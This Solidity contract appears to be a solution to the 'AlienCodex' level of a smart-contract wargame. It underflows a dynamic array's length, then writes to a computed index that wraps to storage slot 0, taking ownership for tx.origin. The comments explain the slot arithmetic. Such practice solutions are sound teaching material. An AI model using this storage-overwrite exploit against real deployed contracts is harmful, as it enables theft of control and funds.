// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {console} from "forge-std/Script.sol";

import {Broadcasted} from "./Broadcasted.sol";

contract AlienCodexAttk is Broadcasted {
    function attack(address payable alienCodexCtr_) public payable override {
        IAlienCodex(alienCodexCtr_).makeContact();
        // decrease the codex length (will underflow)
        IAlienCodex(alienCodexCtr_).retract();
        // set my address in the slot 0 of the storage
        IAlienCodex(alienCodexCtr_).revise(
            calcIdx(),
            bytes32(uint256(uint160(tx.origin)))
        );
    }

    function calcIdx() public pure returns (uint) {
        // ((2 ** 256) - 1) will be the last storage space
        // the idx=0 pos in the array will be keccak256(abi.encode(1)) cuz the array is defined in the storage 1
        // the last storage position will correspond with the ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) index
        // so just adding one to that idx will correspond to the storage at 0
        // ? can check that adding 2 will correspond to the storage at 1 (the array length)
        return ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
    }
}

interface IAlienCodex {
    function makeContact() external;

    // ! the solution for this lvl is to overflow the length of the array and then access the storage at 0
    function retract() external;

    function revise(uint _index, bytes32 _newMessage) external;
}
